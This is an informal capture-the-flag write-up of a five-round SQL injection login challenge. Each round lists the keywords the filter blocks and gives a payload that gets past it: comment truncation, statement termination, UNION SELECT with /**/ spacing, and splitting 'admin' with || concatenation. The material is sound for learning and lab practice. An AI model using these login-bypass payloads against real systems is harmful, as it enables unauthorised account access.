-->In round one filter is or

SELECT * FROM users WHERE username='admin' AND password='admin';

as we need to bypass password because we don't know what the password actually is

SELECT * FROM users WHERE username='admin';--' AND password='admin';

admin';-- this will comment all other things and we pass round 1

--> In Round2: or and like = --

SELECT * FROM users WHERE username='admin'; AND password='admin';

admin'; --> this end the statement and we pass the filter

--> IN Round3: or and = like > < --

We can use same tricks to bypass filters


-->In Round4: or and = like > < -- admin

Now it is restriction that we are not going to use word admin
so we can use a trick that we use union

SELECT * FROM users WHERE username='asna'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;

we concatenate 2 with UNION and limit 1 because in most cases admin is at first

--> In Round5: or and = like > < -- union admin

This time we even don't use union

in SQL  we concatenate strings through || that's how we can pass string like

SELECT * FROM users WHERE username='ad'||'min'; AND password='admin';

ad'||'min'; this concatenate strings and ; end the statement
